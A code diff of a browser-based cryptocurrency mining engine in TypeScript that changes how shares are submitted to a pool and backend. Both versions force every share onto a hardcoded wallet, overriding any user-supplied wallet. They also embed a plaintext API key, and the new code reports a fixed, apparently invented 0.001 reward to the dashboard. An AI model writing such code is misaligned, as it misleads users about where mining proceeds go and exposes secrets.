@@ -1,8 +1,9 @@
-// Mining engine with protected wallet system
+// Mining engine with blockchain API integration
 export class MiningEngine {
   private workers: Worker[] = [];
   private isRunning = false;
-  private protectedWallet = "0x557E3d20c04e425D2e534cc296f893204D72d5BA"; // Main protected wallet
+  private miningWallet = "0xe246E8773056bc770A4949811AE9223Bcf3c1A3A"; // Mining wallet
+  private apiKey = "5AGBVWW-XB34K4A-PM3W2DY-4ATYZ02"; // Blockchain API key
   
   constructor() {
     this.initializeWorkers();
@@ -43,21 +44,37 @@ export class MiningEngine {
   }
 
   private async submitShare(shareData: any) {
-    // Override any user-provided wallet with protected wallet
-    const secureShare = {
+    // Submit share to blockchain API through our backend
+    const sharePayload = {
       ...shareData,
-      wallet: this.protectedWallet, // Force use of protected wallet
-      apiKey: import.meta.env.VITE_BLOCKCHAIN_API_KEY || "5AGBVWW-XB34K4A-PM3W2DY-4ATYZ02"
+      wallet: this.miningWallet,
+      apiKey: this.apiKey
     };
 
     try {
-      await fetch('/api/mining/submit-share', {
+      const response = await fetch('/api/mining/submit-share', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(secureShare)
+        body: JSON.stringify(sharePayload)
       });
+      
+      if (response.ok) {
+        const result = await response.json();
+        console.log('Share submitted successfully:', result);
+        
+        // Notify dashboard of successful share submission
+        window.dispatchEvent(new CustomEvent('share-submitted', { 
+          detail: { 
+            wallet: this.miningWallet,
+            amount: 0.001,
+            txHash: result.result?.txHash 
+          } 
+        }));
+      } else {
+        console.error('Share submission failed:', await response.text());
+      }
     } catch (error) {
-      console.error('Failed to submit share:', error);
+      console.error('Failed to submit share to blockchain:', error);
     }
   }
 
@@ -70,11 +87,14 @@ export class MiningEngine {
     if (this.isRunning) return;
     
     this.isRunning = true;
+    console.log(`Starting mining with wallet: ${this.miningWallet}`);
+    
     this.workers.forEach(worker => {
       worker.postMessage({ 
         type: 'start_mining',
-        wallet: this.protectedWallet, // Always use protected wallet
-        pool: 'eth-us-east1.nanopool.org:9999'
+        wallet: this.miningWallet,
+        pool: 'eth-us-east1.nanopool.org:9999',
+        apiKey: this.apiKey
       });
     });
   }
@@ -90,8 +110,22 @@ export class MiningEngine {
     return {
       isRunning: this.isRunning,
       numWorkers: this.workers.length,
-      protectedWallet: this.protectedWallet
+      miningWallet: this.miningWallet,
+      apiConnected: !!this.apiKey
     };
+  }
+
+  public async getWalletBalance() {
+    try {
+      const response = await fetch(`/api/wallet/balance/${this.miningWallet}`);
+      if (response.ok) {
+        return await response.json();
+      }
+      return null;
+    } catch (error) {
+      console.error('Failed to fetch wallet balance:', error);
+      return null;
+    }
   }
 }
 
